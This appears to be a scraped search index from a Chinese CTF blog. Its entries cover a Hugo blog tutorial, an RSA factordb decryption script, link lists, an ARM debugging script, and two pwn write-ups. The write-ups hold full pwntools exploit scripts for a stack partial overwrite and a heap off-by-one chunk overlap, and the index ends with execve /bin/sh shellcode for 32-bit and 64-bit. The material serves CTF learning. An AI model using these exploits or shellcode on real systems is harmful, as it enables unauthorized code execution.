ctx.clearRect(0, 0, testImg.width, testImg.height); ctx.drawImage(img, 0, 0); // 将canvas转为blob canvas.toBlob(async blob =\u0026gt; { console.log(blob); const data = [ new ClipboardItem({ [blob.type]: blob, }), ]; // https://w3c.github.io/clipboard-apis/#dom-clipboard-write await navigator.clipboard.write(data) .then( () =\u0026gt; { flashCopyMessage(btn, \u0026#34;已复制分享二维码！\u0026#34;); console.log(\u0026#34;Copied to clipboard successfully!\u0026#34;); }, () =\u0026gt; { flashCopyMessage(btn, \u0026#34;复制分享二维码失败:(\u0026#34;); console.error(\u0026#34;Unable to write to clipboard.\u0026#34;); } ); }); } } btn.addEventListener(\u0026#34;click\u0026#34;, handleCopyImg, false); //msgbtn.addEventListener(\u0026#34;click\u0026#34;, copy_invite_message, false); \u0026lt;/script\u0026gt; \u0026lt;br /\u0026gt; 其中buttun的样式是在增加订阅功能里订阅按钮使用的（增加了一些样式），如下：\n\u0026lt;style\u0026gt; .button { font-family: 宋体,\u0026#39;Comic Sans MS\u0026#39;, cursive; color: #FFFFFF; background-color: #333333; display: inline-block; white-space: nowrap; height: 40px; min-width: 230px; line-height: 42px; margin: 0 5px 0 0; padding: 0 22px; text-decoration: none; /* text-transform: uppercase; */ text-align: center; font-weight: medium; font-style: normal; font-size: 14px; cursor: pointer; border: 0; -moz-border-radius: 4px; border-radius: 4px; -webkit-border-radius: 4px; vertical-align: top; -webkit-font-smoothing: antialiased; font-smoothing: antialiased; } .button:hover { cursor: pointer; animation: jelly 0.7s; } @keyframes jelly { 0%, 100% { transform: scale(0.1, 0.1); } 33% { transform: scale(0.05, 0.15); } 66% { transform: scale(0.15, 0.05); } } @keyframes jelly { 0%, 100% { transform: scale(1, 1); } 25%, 75% { transform: scale(0.9, 1.1); } 50% { transform: scale(1.1, 0.9); } } i.invite_icon{ height: 5vh; width: 5vh; display: block; font-size: 30px; transition: all 1.5s; position: fixed; right: 1vh; bottom: 7vh; z-index: 100; background: transparent; transition: 0.1s; } i.invite_icon:active{ transform:rotate(-45deg); } i.sub_icon{ height: 5vh; width: 5vh; display: block; font-size: 30px; transition: all 1.5s; position: fixed; right: 1vh; bottom: 13vh; z-index: 100; background: transparent; } \u0026lt;/style\u0026gt; 使用sweetalert改进弹窗消息 查看SweetAlert官方文档后，在themes/eureka/layouts/partials/head.html处加上：\n\u0026lt;script src=\u0026#34;https://unpkg.com/sweetalert/dist/sweetalert.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 读者打开网站主页自动推送最新文章消息 在themes/eureka/layouts/partials/footer.html末尾加上：\n\u0026lt;script\u0026gt; function is_weixn(){ var ua = navigator.userAgent.toLowerCase(); if(ua.match(/MicroMessenger/i)==\u0026#34;micromessenger\u0026#34;) { return true; } else { return false; } } if(is_weixn()){ alert(\u0026#34;检测到您使用的浏览器是微信内置浏览器，渲染会出现严重问题，极度影响阅读体验，建议使用其他浏览器打开本网址。\\n请复制本网址到剪切板，然后前往手机浏览器内打开：\\n{{ .Permalink }}（或者右上角用浏览器打开）\u0026#34;); }else{ window.alert = function(msg1, msg2, msg3){ swal(msg1+\u0026#34;\u0026#34;, msg2+\u0026#34;\u0026#34;, msg3+\u0026#34;\u0026#34;); } {{- $page_context := cond .IsHome site . -}} {{- $pages := $page_context.RegularPages -}} {{- $pages = $pages | first 1 -}} {{ if eq .Permalink .Site.BaseURL }} {{ range $pages }} swal({ title: \u0026#39;{{ .Date.Format \u0026#34;2006年01月02日\u0026#34; | safeHTML }}\\n最新发布博文：\\n\u0026#39;, text: decodeURIComponent(\u0026#34;{{ .Title }}\\t{{ .Permalink }}\u0026#34;), icon: \u0026#34;info\u0026#34;, buttons: { copy: { text: \u0026#34;复制链接\u0026#34;, value: \u0026#34;copy\u0026#34;, className: \u0026#34;grey-bg\u0026#34; }, direct: { text: \u0026#34;阅读博文\u0026#34;, value: \u0026#34;direct\u0026#34; } , out: { text: \u0026#34;我知道了\u0026#34;, value: \u0026#34;cancel\u0026#34;, className: \u0026#34;red-bg\u0026#34; } }, dangerMode: false }).then((value) =\u0026gt; { switch (value) { case \u0026#34;copy\u0026#34;: navigator.clipboard.writeText(\u0026#34;{{ .Permalink }}\u0026#34;); swal(\u0026#34;复制成功！\u0026#34;, \u0026#34;您可以粘贴到浏览器地址栏查看博文\u0026#34;, \u0026#34;success\u0026#34;); break; case \u0026#34;direct\u0026#34;: window.open(\u0026#34;{{ .Permalink }}\u0026#34;, \u0026#34;{{ .Title }}\u0026#34;); break; case out: default: break; } }); {{ end }} {{ end }} } \u0026lt;/script\u0026gt; 代码里还包括了检测是否是微信内置浏览器，如是，弹出警告信息\n然后根据需要定义button的样式（更改代码中的className字段），下面是我定义的class，仅供参考：\n.red-bg{ background-color: rgba(254, 3, 3, 0.667); } .red-bg:hover{ background-color: rgba(254, 3, 3, 0.769) !important; } .grey-bg{ background-color: rgba(130, 124, 124, 0.758); } .grey-bg:hover{ background-color: rgba(130, 124, 124, 0.888) !important; } 然后对深色模式进行兼容（在head.html加上）：\n\u0026lt;style\u0026gt; .dark .swal-modal{ filter: invert(80%); } .dark .swal-overlay{ filter: brightness(1.5); } \u0026lt;/style\u0026gt; 效果如图：\n目前来说，作者就添加了这么点功能，要是以后探索到更多有趣的功能，会更新这篇文章，所以，愿意订阅我的博客吗？\n","date":"2023年01月08日","permalink":"https://peterliuzhi.top/posts/%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%E6%90%AD%E5%BB%BAhugo%E5%8D%9A%E5%AE%A2/","section":"posts","summary":"Serious sport has nothing to do with fair play. It is bound up with hatred, jealousy, boastfulness, disregard of all rules and sadistic pleasure in witnessing violence. In other words, it is war minus the shooting. — George Orwell 安装 hugo hugo 中文文档 在releases 界面下载 hugo 的 exe 文件（windows可以","tags":["杂谈","hugo","博客"],"title":"保姆级教程——搭建Hugo博客"},{"categories":null,"contents":"","date":"2023年01月07日","permalink":"https://peterliuzhi.top/subscribe/subscribe/","section":"subscribe","summary":"","tags":null,"title":"订阅"},{"categories":["tricks","scripts"],"contents":" Tragedy is a tool for the living to gain wisdom, not a guide by which to live. — Robert F. Kennedy\nfactordb.com的分解速度很快，解密RSA的过程中我们可能会用到，于是我写了一个基础爬虫python脚本从factordb.com请求数据得到p和q后求逆得到d自动解密c，脚本不是很优雅，如果有师傅能改进，烦请师傅贴在评论区造福后来人，感谢您\n脚本 import re import requests from bs4 import BeautifulSoup import gmpy2 from Crypto.Util.number import * c = 0 n = 0 print(f\u0026#34;[+]n={n}\u0026#34;) p_q = [] # 一般来说需要代理才能连上网络，有些代理加速器也不用这样配置 proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://?.?.?.?:?\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://?.?.?.?:?\u0026#34;, } url = \u0026#34;http://factordb.com/index.php?\u0026#34; html_doc = requests.get(url, params={\u0026#34;query\u0026#34;: n}, proxies=proxies) # 创建一个BeautifulSoup解析对象 soup = BeautifulSoup(html_doc.text, \u0026#34;html.parser\u0026#34;, from_encoding=\u0026#34;utf-8\u0026#34;) # 获取所有的链接 links = soup.find_all(\u0026#39;a\u0026#39;) print(\u0026#34;所有的链接:\u0026#34;) full_link = [] for link in links: if link is not None \\ and link.get(\u0026#39;href\u0026#39;) is not None \\ and \u0026#34;index.php?id=\u0026#34; in link.get(\u0026#39;href\u0026#39;): full_link.append(f\u0026#34;http://factordb.com/{link.get(\u0026#39;href\u0026#39;)}\u0026#34;) print(full_link[-1]) # 从链接中获取p和q for link in full_link: html_doc = requests.get(link) tmp_soup = BeautifulSoup( html_doc.text, \u0026#34;html.parser\u0026#34;, from_encoding=\u0026#34;utf-8\u0026#34;) content = tmp_soup.select( \u0026#34;body \u0026gt; form \u0026gt; center \u0026gt; input[type=text]:nth-child(1)\u0026#34;) num = int(content[0].get(\u0026#34;value\u0026#34;)) if num != n: p_q.append(num) p, q = p_q print(f\u0026#34;[+]p={p}\u0026#34;) print(f\u0026#34;[+]q={q}\u0026#34;) # 求欧拉函数 phi = (p-1)*(q-1) # 求e的逆d e = 0 d = gmpy2.invert(e, phi) # 用私钥解密 m = pow(c, d, n) print(f\u0026#34;[+]对c={c}的解密结果是：\u0026#34;) result = long_to_bytes(m) try: print(result.decode(\u0026#34;UTF-8\u0026#34;)) except Exception as e: print(result) 运行结果示例 ","date":"2023年01月06日","permalink":"https://peterliuzhi.top/tricks/rsa%E5%9F%BA%E7%A1%80%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8factordb.com%E5%88%86%E8%A7%A3n/","section":"tricks","summary":"Tragedy is a tool for the living to gain wisdom, not a guide by which to live. — Robert F. Kennedy factordb.com的分解速度很快，解密RSA的过程中我们可能会用到，于是我写了一个基础爬虫python","tags":["crypto"],"title":"RSA基础解密脚本（使用factordb.com分解n）"},{"categories":["writeup","BSides Mumbai"],"contents":" When I let go of what I am, I become what I might be. — Laozi\n附件程序\nchecksec查看程序架构 ida查看伪C代码 我们可以通过程序给的printf来得到buf的地址，也就是栈地址\n在vuln函数中有一个明显的栈溢出漏洞，但是它能溢出的长度很微妙，没有办法直接调用win函数，因为win函数要求多个参数：\n但我们知道，虽然64位系统的函数调用的前六个参数是保存在寄存器中的，但是我们看win函数的汇编代码，最后还是要读到栈中，因此我们可以先将三个参数安排在栈中，同时控制rbp的值，跳过将参数读入到栈中的过程：\n但是还有一个问题，我们只能读入0x2C个字节，同时因为PIE的存在，我们不知道win函数的实际地址，这该怎么在vuln函数中转入win函数？\n我们调试发现，vuln函数原本的返回地址是main+104，而win函数恰好在main下面：\n又因为页机制的存在，函数地址的最后三位是不变的，所以我们只需要更改最后一个字节就好\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./BSides-chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;1337\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;34.70.253.176\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x1320) b* $rebase(0x131A) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... sendline_after_clean() stack = recv_and_transform(\u0026#34;0x\u0026#34;, from_bytes=False, bound=\u0026#34;\\n\u0026#34;) suclog( stack=stack ) payload = flat([ stack, p32(11534522) + p32(1590475454) ]).ljust(0x20, b\u0026#34;\\x00\u0026#34;) + flat([ stack - 38, p8(0x8E) ]) send_after_clean(payload) interactive_after_clean(no_show=False) ","date":"2023年01月04日","permalink":"https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/","section":"writeup","summary":"When I let go of what I am, I become what I might be. — Laozi 附件程序 checksec查看程序架构 ida查看伪C代码 我们可以通过程序给的printf来得到buf的地址，也就是栈地址","tags":["pwn"],"title":"【BSides Mumbai 2022 PWN】Warmup"},{"categories":["writeup"],"contents":" No man is free who is not master of himself. — Epictetus\n原题链接\nchecksec查看程序架构 ida查看伪C代码 create_heap 分配的chunk结构体包括一个保存size的int，和一个指向其他内存的指针：\n其中第二个chunk的大小是任意的，这上面就可以做文章\nedit_heap 我们可以看到，最后读取到的内容会比保存的大小多1：\n如果我们分配的大小刚刚好涵盖了prev_size这个域，那么我们的输入就可以更改下一个chunk的size域\nshow_heap 看到这个函数，我们马上想到，如果将heaparray[v1]-\u0026gt;ptr改成某个函数的got值，就可以泄露出libc基址\ndelete_heap 这个函数在释放后会将指针归零，因此用不了UAF\n大致思路 这道题的关键是我们要获得更改heaparray[v1]-\u0026gt;ptr这个指针的能力，而显而易见的，最明显的溢出漏洞在edit_heap那里有一个off by one漏洞，我们可以更改下一个chunk的size域，让它覆盖掉下面几个chunk，这样释放后再分配的时候就能获得更改被覆盖的chunk的权利\nchunk overlap 更多阅读：Chunk Extend and Overlapping - CTF Wiki\n需要注意的是，我们输入的size是0x18，但是由于size位的存在，最后分配得到的chunk大小是0x20\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./heapcreator\u0026#34; libc_name: str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;26654\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) # sendline_after_clean(str(index)) sendline_after_clean(str(size)) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;4\u0026#34;) sendline_after_clean(str(index)) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) def change(index: int, content: bytes, newline: bool = True) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) if newline: sendline_after_clean(content) else: send_after_clean(content) allocate(0x18, b\u0026#34;0\u0026#34;) allocate(0x18, b\u0026#34;1\u0026#34;) allocate(0x18, b\u0026#34;2\u0026#34;) payload = flat([ \u0026#34;/bin/sh\\x00\u0026#34;, 0, 0 ]) + p8(0x81) change(0, payload, False) remove(1) allocate(0x70, flat([ pg(0)*8, 8, m_elf.got[\u0026#39;free\u0026#39;] ])) show(2) free_got = recv_and_transform(\u0026#34;Content : \u0026#34;) base_addr = free_got - libc.sym[\u0026#39;free\u0026#39;] system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] suclog( free_got=free_got, base_addr=base_addr, system_addr=system_addr ) change(2, pg(system_addr)) remove(0) interactive_after_clean() ","date":"2023年01月03日","permalink":"https://peterliuzhi.top/writeup/hitcontraining_heapcreator/","section":"writeup","summary":"No man is free who is not master of himself. — Epictetus 原题链接 checksec查看程序架构 ida查看伪C代码 create_heap 分配的chunk结构体包括一个保存size的int，和一个指向其他内存","tags":["pwn","chunk overlap","off by one"],"title":"hitcontraining_heapcreator"},{"categories":["tricks","链接集锦"],"contents":" True happiness means forging a strong spirit that is undefeated, no matter how trying our circumstances. — Daisaku Ikeda\nGlibc source code (glibc-2.36.9000) - Bootlin，在线查看源码\nIndex of /gnu/glibc，直接从官网下载源码\nGitHub - bminor/glibc: Unofficial mirror of sourceware glibc repository. Updated daily.使用git checkout更换版本\nglibc/glibc/ Source Tree，在线源码浏览器\n","date":"2023年01月03日","permalink":"https://peterliuzhi.top/tricks/glibc-source-code%E6%BA%90%E7%A0%81/","section":"tricks","summary":"True happiness means forging a strong spirit that is undefeated, no matter how trying our circumstances. — Daisaku Ikeda Glibc source code (glibc-2.36.9000) - Bootlin，在线查看源码 Index of /gnu/glibc，直接从官网下载源码 GitHub - bminor/glibc: Unofficial mirror of sourceware glibc repository. Updated daily","tags":["pwn","glibc","源码"],"title":"glibc source code源码"},{"categories":["tricks","链接集锦"],"contents":" Love is the attempt to form a friendship inspired by beauty. — Cicero\nLinux System Calls quick and easy，美化很不错\n可搜索的syscall表，但目前只支持x86_64\nChromium OS Docs - Linux System Call Table，和Linux大致一样，体验不错\nMicrosoft Windows System Call Table (XP/2003/Vista/2008/7/2012/8/10)，阴间审美\nLinux System Call Table for x86 64 · Ryan A. Chapman，个人博客备份\nlinux/syscall_64.tbl at v4.17 · torvalds/linux · GitHub，李纳斯在GitHub上开源的Linux内附的table文件\nlinux/syscall_32.tbl at v4.17 · torvalds/linux · GitHub，李纳斯在GitHub上开源的Linux内附的table文件\nlinux/unistd.h at v4.17 · torvalds/linux · GitHub，arm版本的\nlinux/syscall.tbl at v4.17 · torvalds/linux · GitHub，arm64版本的\nWhere do you find the syscall table for Linux? - Unix \u0026amp; Linux Stack Exchange\n","date":"2023年01月03日","permalink":"https://peterliuzhi.top/tricks/%E5%90%84%E5%B9%B3%E5%8F%B0syscall%E5%BA%8F%E5%8F%B7/","section":"tricks","summary":"Love is the attempt to form a friendship inspired by beauty. — Cicero Linux System Calls quick and easy，美化很不错 可搜索的syscall表，但目前只支持x86_64 Chromium OS Docs - Linux System Call Table，和Linux大致一","tags":["pwn","syscall"],"title":"各平台syscall序号"},{"categories":["tricks"],"contents":" Motivation is the art of getting people to do what you want them to do because they want to do it. — Dwight D. Eisenhower\n初始化arm调试环境 sudo apt-get install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential qemu gdbserver gdb-multiarch libc6-arm64-cross 有些Ubuntu版本可能有些库没有，或者更名了，如果仅调试可以只用：\nsudo apt-get install qemu gdbserver gdb-multiarch libc6-arm64-cross 其中libc6-arm64-cross在不同系统名字可能不一样，可以使用以下指令检查：\nsudo apt search \u0026#34;libc6-\u0026#34; | grep \u0026#34;arm\u0026#34; 更多阅读：\narm pwn入门 | blingbling\u0026rsquo;s blog 用qemu在指定端口运行程序并自动用gdb连接该程序 将下列代码保存为脚本ARM，复制到/usr/local/bin/并增加可执行权限，使用方法：\nARM [端口号] [程序名] #!/bin/bash if [[ \u0026#34;$*\u0026#34; =~ \u0026#34;--help\u0026#34; ]] || [[ \u0026#34;$*\u0026#34; =~ \u0026#34;-h\u0026#34; ]]; then echo \u0026#34;【用法】$(basename $0) 程序运行的端口号 程序文件名\u0026#34; echo \u0026#34;脚本自动判断32位还是64位，同时设置大小端\u0026#34; echo \u0026#34;程序运行的端口号和程序文件名不得确实，不然脚本不会运行\u0026#34; echo \u0026#34;示例：\u0026#34; echo -e \u0026#34;\\t$(basename $0) 1234 example\u0026#34; echo \u0026#34;By PeterLiu\u0026#34; exit 0 fi if [[ -z $1 ]];then echo \u0026#34;缺失端口号！\u0026#34; exit 3 elif [[ ! $1 =~ ^[0-9]+$ ]];then echo \u0026#34;端口号必须是数字！\u0026#34; exit 3 fi if [[ -z $2 ]];then echo \u0026#34;缺失程序名！\u0026#34; exit 4 fi result=`file $2` if [[ ! $result =~ \u0026#34;ARM\u0026#34; ]];then echo \u0026#34;不是ARM架构程序！\u0026#34; exit 1 fi if [[ $result =~ \u0026#34;32-bit\u0026#34; ]];then echo \u0026#34;$1是32位系统\u0026#34; qemu-arm -g $1 $2 \u0026amp; elif [[ $result =~ \u0026#34;64-bit\u0026#34; ]];then echo \u0026#34;$1是64位系统\u0026#34; qemu-aarch64 -L /usr/aarch64-linux-gnu -g $1 $2 \u0026amp; else echo \u0026#34;无法判断架构！\u0026#34; exit 2 fi endian=`readelf -h typo | grep endian` if [[ $endian =~ \u0026#34;little endian\u0026#34; ]];then gdb $2 -ex \u0026#34;set endian little\u0026#34; \\ -ex \u0026#34;set architecture arm\u0026#34; \\ -ex \u0026#34;target remote localhost:$1 \u0026#34; else gdb $2 -ex \u0026#34;set endian big\u0026#34; \\ -ex \u0026#34;set architecture arm\u0026#34; \\ -ex \u0026#34;target remote localhost:$1 \u0026#34; fi ","date":"2023年01月02日","permalink":"https://peterliuzhi.top/tricks/pwn%E4%B8%AD%E8%B0%83%E8%AF%95arm%E7%A8%8B%E5%BA%8F/","section":"tricks","summary":"Motivation is the art of getting people to do what you want them to do because they want to do it. — Dwight D. Eisenhower 初始化arm调试环境 sudo apt-get install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential qemu gdbserver gdb-multiarch libc6-arm64-cross 有些Ubuntu版本可能有些库没有，或者更名了，如果仅","tags":["pwn"],"title":"PWN中调试arm程序"},{"categories":["tricks"],"contents":" The industrial landscape is already littered with remains of once successful companies that could not adapt their strategic vision to altered conditions of competition. — Ralph Abernathy\n有些时候因为栈的原因，程序运行时会破坏shellcode，这时候可以加一堆ret来抬高栈，也可以选择更为简短的shellcode\n32位shellcode shellcode_32 = asm( \u0026#39;\u0026#39;\u0026#39; xor ecx, ecx mul ecx push ecx push 0x68732f2f push 0x6e69622f mov ebx, esp mov al, 0xb int 0x80 \u0026#39;\u0026#39;\u0026#39; ) 或\nshellcode_32 = b\u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; 效果对比 64位shellcode shellcode_64 = asm( \u0026#39;\u0026#39;\u0026#39; dec eax xor esi, esi push esi dec eax mov edi, 0x6e69622f das das jae 0x76 push edi push esp pop edi push 0x3b pop eax cdq syscall \u0026#39;\u0026#39;\u0026#39; ) 